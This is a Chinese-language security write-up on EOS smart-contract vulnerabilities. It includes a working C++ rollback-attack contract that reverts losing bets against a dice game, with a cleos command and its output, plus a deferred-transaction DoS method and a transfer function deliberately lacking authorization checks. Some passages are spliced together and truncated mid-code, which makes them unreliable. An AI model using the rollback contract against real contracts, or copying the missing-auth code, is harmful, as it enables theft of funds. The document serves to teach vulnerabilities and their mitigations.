#### 针对 inline action 的回滚攻击
##### 漏洞介绍
该攻击的前提假设是中奖是实时检测和发放的，即被攻击合约转账的过程中会计算竞猜结果并即时发放奖励，如果中奖则恶意合约的EOS余额会增加。因而在"给竞猜合约转账"action后插入一个余额检测的action即可做到盈利检测。
背景知识：
上文提到，Action 就是 EOS 上消息（EOS 系统是以消息通信为基础的）的载体。如果想调用某个智能合约，那么就要给它发 Action 消息。
  * inline action
内联交易：多个不同的 action 在一个 transaction 中（在一个交易中触发了后续多个 Action ），在这个 transaction
中，只要有一个 action 异常，则整个 transaction 会失败，所有的 action 都将会回滚。
  * defer action
延迟交易：两个不同的 action 在两个 transaction 中，每个 action 的状态互相不影响。
##### 漏洞示例
![
](https://images.seebug.org/content/images/2021/05/1f9f5e0e-0ae9-42f8-8e9f-563732418a26.png-w331s)
图片来自区块链斜杠青年
##### 攻击示例
攻击合约
    #include 
    #include "eosio.token.hpp"
    using namespace eosio;
    class [[eosio::contract]] rollback : public contract {
      public:
          using contract::contract;
          [[eosio::action]]
          void roll( name to, asset value, string memo ) {
             asset balance = eosio::token::get_balance(
                     name("eosio.token"),
                     name("bob"),
                     symbol_code("BOB")
              );
             action(
                   permission_level{ _self,name("active")},
                   name("eosio.token"),
                   name("transfer"),
                   std::make_tuple(_self,to,value,memo)
             ).send();
            action(
                   permission_level{ _self,name("active")},
                   _self,
                   name("checkbalance"),
                   std::make_tuple(balance)
             ).send();
          }
          [[eosio::action]]
          void checkbalance( asset data) {
             auto newBalance = eosio::token::get_balance(
                     name("eosio.token"),
                     name("bob"),
                     symbol_code("BOB")
              );
             eosio_assert( newBalance.amount > data.amount,"lose");
          }
    };
    EOSIO_DISPATCH( rollback, (roll)(checkbalance))
攻击合约将所有lose的结果全部回滚，只接受win的结果，稳赢不输。
    Adas-Macbook-Pro:rollback ada$ cleos push action bob roll '["eosdiceadmin", "100.0000 BOB", "dice-50-eosdiceadmin"]' -p bob
    executed transaction: b25e84729de7f397d02c77465dce2345fb78c3bd62809dc30c9b7a5cf09caa45  144 bytes  2193 us
    #           bob 
        void send_defer_action(Args &&... args)
    {
            transaction trx;
            trx.actions.emplace_back(std::forward(args)...);
            trx.delay_sec = 1;
            trx.send(next_id(), _self, false);
        }
##### 攻击示例
EOS限制一个transaction最长执行时间为10ms, 超时后就会报错，由于该交易报错失败，从而不消耗任何CPU资源，从而该攻击无成本。
因为 BP 节点有 API Node 防护，所以直接发起超时执行的交易（如，执行死循环）会被 API Node
防护过滤掉。攻击者采用了一个非常巧妙的方法绕过 API Node 防护 -- 发送延迟交易。
![
](https://images.seebug.org/content/images/2021/05/278ba57a-fccf-40a5-b900-94c21b24f082.png-w331s)
图片来自区块链斜杠青年
攻击者先发起一个含有延时交易的合法交易，然后合法交易就会成功执行并被广播进入BP Node, 由于这个合法交易会发起死循环的延时交易，从而 BP Node
在执行这个合法交易的时候也会生成这些死循环的恶意交易，因而死循环恶意交易进入网络核心层，大量吞噬了出块节点的CPU，导致 DoS。
##### 规避建议
  * 增加交易执行顺序的随机性。比如以太坊就是交易费高的先执行，由于这个交易费是交易发起者用户设置的，自然是随机的，不可预测的。
  * 增加执行超时交易成本。目前交易执行超时不会消耗任何CPU，可以考虑超时执行的交易也消耗CPU，这就要求这些超时交易记录在链上，同时可以增加透明性。
  * 限制延迟交易执行时间。
此攻击整理自：
### 权限控制类威胁
权限控制漏洞是一类通用问题。EOS 平台除了有无权限控制和权限控制不当问题之外，还比以太坊平台多一类合约滥用用户权限的问题，这是因为 EOS
平台和以太坊平台的权限模型不同。
#### 合约对用户无权限控制 — transfer 函数
这类问题表现形式就是敏感函数没有做权限控制。
##### 漏洞介绍
敏感操作没有权限校验是常见的漏洞类型，EOS 平台的表现方式是敏感操作没有调用 require_auth(xx)
进行权限校验。如，没有校验from是否为调用者本人，这样就会导致任何一个人都可以转移其他人的代币，不需要任何授权。
##### 漏洞示例
转账操作无访问控制
    void token::transfer( const name&    from,
                          const name&    to,
                          const asset&   quantity,
                          const string&  memo )
    {
        check( from != to, "cannot transfer to self" );
        check( is_account( to ), "to account does not exist ");
        auto sym = quantity.symbol.code();
        stats statstable( get_self(), sym.raw() );
        const auto& st = statstable.get( sym.raw() );
        require_recipient( from );
        require_recipient( to );
        check( quantity.is_valid(), "invalid quantity" );
        check( quantity.amount > 0, "must transfer positive quantity" );
        check( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
        check( memo.size() 
    #include 
    using namespace eosio;
    using namespace std;
    class [[eosio::contract]] call : public contract {
      public:
          using contract::contract;